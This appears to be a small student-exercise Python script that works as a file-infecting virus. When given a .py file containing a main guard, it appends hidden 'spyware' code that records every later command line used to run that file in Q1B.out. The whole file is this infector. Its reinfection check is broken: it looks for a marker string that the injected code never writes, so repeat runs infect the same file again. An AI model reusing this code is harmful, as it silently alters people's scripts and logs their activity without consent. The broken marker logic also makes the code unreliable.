import sys

def arg_check():
    # Check if the correct number of command-line arguments is provided
    if len(sys.argv) != 2:
        print("Usage: python Q1B.py <filename.py>")
        sys.exit(1)

def file_read(filename):
    # Read the contents of the file into a list of lines
    with open(filename) as f:
        lines = [line.rstrip('\n') for line in f]
    return lines

def get_filename():
    # Get the filename from the command-line argument
    filename = sys.argv[1]
    return filename

def is_script(filename):
    with open(filename) as f:
        file_text = f.read()
    return "if __name__ == '__main__':" in file_text or 'if __name__ == "__main__":' in file_text

def validate_filename(filename):
    # Check if the filename ends with '.py'
    if not filename.endswith('.py'):
        print("Please provide a .py file.")
        sys.exit(1)

def virus_check(filename):
    # Check if the given file is a Python script
    with open(filename) as f:
        file_text = f.read()
    return "aint that just the way" in file_text

def add_virus(f): # writes spy code into file
    command_line = f"python3 {f}"
    with open('Q1B.out', 'a') as file:
        file.write(command_line + '\n')

    with open(f, 'a') as file:
        file.write('\n\n# Spyware added\n')
        file.write("import sys\n")
        file.write("command_line = ' '.join(sys.argv)\n")
        file.write("with open('Q1B.out', 'a') as output_file:\n")
        file.write("    output_file.write(command_line + '\\n')\n")
        file.write("print('Spyware executed successfully')\n")  # Add this line to check if spyware code is executed

    print(f"Spyware successfully injected into '{f}'")

def main():
    arg_check()
    filename = get_filename()
    validate_filename(filename)

    if is_script(filename):
        print(f"{filename} is a valid Python script.")
        if not virus_check(filename):
            print(f"{filename} does not contain the virus.")
            add_virus(filename)
            print(f"Virus added to {filename}.")
        else:
            print(f"{filename} already contains the virus.")
    else:
        print(f"{filename} is not a valid Python script.")
    
main()

